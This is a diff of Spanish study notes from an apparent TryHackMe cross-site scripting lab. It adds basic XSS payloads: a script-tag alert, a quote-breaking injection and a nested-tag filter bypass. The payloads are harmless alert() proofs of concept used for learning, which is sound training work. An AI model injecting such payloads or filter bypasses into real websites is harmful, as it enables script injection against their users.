@@ -196,5 +196,30 @@ Usualmente por consutlas HTTP, y ver si se ha ejecutado.
 
 Una herramienta importante para esto es "XSS HUNTER EXPRESS"
 
-## EJERCICIO
+# EJERCICIO
+
+```
+<script>alert('THM');</script>
+```
+
+![image](https://github.com/user-attachments/assets/0f9d4e37-842a-463a-b521-9a132a3fb47f)
+
+![image](https://github.com/user-attachments/assets/1661dd4e-3ec7-4a94-a7ea-9a0a703812b6)
+
+```
+';alert('THM');//
+```
+
+![image](https://github.com/user-attachments/assets/c469f52e-c2ab-47a4-9be7-d1de96c931f1)
+
+```
+ <sscriptcript>alert('THM');</sscriptcript>
+```
+![image](https://github.com/user-attachments/assets/7cbf2fc2-94f8-4a17-8293-03940115bcd6)
+
+
+
+
+
+
 
